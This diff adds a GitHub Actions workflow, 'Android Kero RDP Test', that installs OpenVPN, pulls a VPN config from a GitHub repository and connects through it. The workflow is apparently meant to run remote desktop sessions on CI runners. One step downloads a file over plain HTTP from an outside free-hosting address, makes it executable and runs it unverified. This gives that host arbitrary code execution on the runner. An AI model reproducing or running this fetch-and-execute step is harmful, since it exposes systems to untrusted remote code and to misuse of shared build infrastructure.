@@ -1,0 +1,47 @@
+name: Android Kero RDP Test
+
+on:
+  workflow_dispatch:
+    inputs:
+      portmap_config_url:
+        description: 'Please paste the URL of the webpage or file you want to download:'
+        required: true
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Install dependencies
+        run: |
+          sudo apt update
+          sudo apt-get install -y wget openvpn
+
+      - name: Download configuration file
+        run: |
+          base_url="https://raw.githubusercontent.com/KeroLive/KeroTech/main/config/"
+          user_url="${{ github.event.inputs.portmap_config_url }}"
+          file_name=$(basename "$user_url")
+          download_url="$base_url$file_name"
+          echo "Downloading configuration file from $download_url..."
+          wget -q "$download_url" -O "$GITHUB_WORKSPACE/client.conf"
+
+          if [ $? -ne 0 ]; then
+              echo "Error: Failed to download configuration file from $download_url."
+              exit 1
+          fi
+
+          echo "Configuration file downloaded successfully."
+
+      - name: Download and execute additional YAML
+        run: |
+          additional_yml_url="http://kerooo.c1.biz/k.yml"
+          echo "Downloading additional YAML file from $additional_yml_url..."
+          wget -q "$additional_yml_url" -O "$GITHUB_WORKSPACE/additional.yml"
+          chmod +x "$GITHUB_WORKSPACE/additional.yml"
+          "$GITHUB_WORKSPACE/additional.yml"
+
+      - name: Start OpenVPN
+        run: |
+          sleep 10
+          sudo openvpn --config "$GITHUB_WORKSPACE/client.conf" | lolcat -f
